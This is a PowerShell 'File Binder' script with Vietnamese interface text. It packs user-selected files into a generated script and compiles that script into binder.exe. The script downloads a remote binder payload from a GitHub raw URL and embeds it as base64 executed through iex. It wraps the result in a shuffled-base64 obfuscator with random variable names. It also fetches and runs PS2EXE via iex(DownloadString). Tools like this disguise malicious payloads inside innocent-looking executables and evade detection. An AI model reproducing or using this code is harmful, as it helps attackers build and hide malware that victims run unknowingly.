# Define the URL to download the content from
$url = "https://raw.githubusercontent.com/s1uiasdad/binder/main/file/binder.ps1"

# Create the directory if it doesn't exist
$directoryPath = ".\fileinhere"
if (-Not (Test-Path -Path $directoryPath)) {
    New-Item -Path $directoryPath -ItemType Directory
}

# Function to create the binder.ps1 and binder.exe
function Create-BinderFiles {
    # Download and base64 encode the content
    $content = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content
    $codebinder = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))

    # Remove binder.ps1 if it exists
    if (Test-Path "binder.ps1") {
        Remove-Item "binder.ps1"
    }

    # Create binder.ps1 and add necessary content
    foreach ($file in $selectedFiles) {
        # Read file content and base64 encode it
        $fileContent = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($file.FullName))
        $fileName = $file.Name

        # Append content to binder.ps1
        Add-Content -Path "binder.ps1" -Value "`$Filecontent = '$fileContent'"
        Add-Content -Path "binder.ps1" -Value "`$name = '$fileName'"
        Add-Content -Path "binder.ps1" -Value "iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('$codebinder')))"
    }

    # Inform that the binder.ps1 has been created
    Write-Output "Đã hoàn tất tạo file binder.ps1"

    # Obfuscate the binder.ps1 content
    function Base64-Obfuscator {
        [CmdletBinding()]
        Param (
            [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
            [string]$Data
        )
        PROCESS {
            $Seed = Get-Random
            $MixedBase64 = [Text.Encoding]::ASCII.GetString(([Text.Encoding]::ASCII.GetBytes($Data) | Sort-Object { Get-Random -SetSeed $Seed }))
            $Var1 = -Join ((65..90) + (97..122) | Get-Random -Count ((1..12) | Get-Random) | %{[char]$_})
            $Var2 = -Join ((65..90) + (97..122) | Get-Random -Count ((1..12) | Get-Random) | %{[char]$_})
            return "`$$($Var1) = [Text.Encoding]::ASCII.GetString(([Text.Encoding]::ASCII.GetBytes(`'$($MixedBase64)') | Sort-Object { Get-Random -SetSeed $($Seed) })); `$$($Var2) = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(`$$($Var1))); IEX `$$($Var2)"
        }
    }

    $fileContent = Get-Content -Path "binder.ps1" -Raw
    $base64Encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileContent))
    $code = Base64-Obfuscator -Data $base64Encoded
    Set-Content -Path "binder.ps1" -Value $code

    # Download and use PS2EXE to convert the script to an executable
    iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MScholtes/PS2EXE/master/Module/ps2exe.ps1')
    Invoke-ps2exe "binder.ps1" "binder.exe"
    Write-Output "Đã hoàn tất tạo file binder.exe"
}

# GUI to select files
Add-Type -AssemblyName System.Windows.Forms
$dialog = New-Object System.Windows.Forms.OpenFileDialog
$dialog.Multiselect = $true
$dialog.Filter = "All Files (*.*)|*.*"
$dialog.Title = "Chọn các tệp để thêm vào binder.ps1"

if ($dialog.ShowDialog() -eq 'OK') {
    $selectedFiles = $dialog.FileNames
    $buildButton = New-Object System.Windows.Forms.Button
    $buildButton.Text = "Build"
    $buildButton.Add_Click({
        # Convert selected file paths to FileInfo objects
        $selectedFiles = $selectedFiles | ForEach-Object { [System.IO.FileInfo]$_ }
        Create-BinderFiles
    })

    $form = New-Object System.Windows.Forms.Form
    $form.Text = "File Binder"
    $form.Width = 300
    $form.Height = 100
    $form.Controls.Add($buildButton)
    $form.ShowDialog()
}
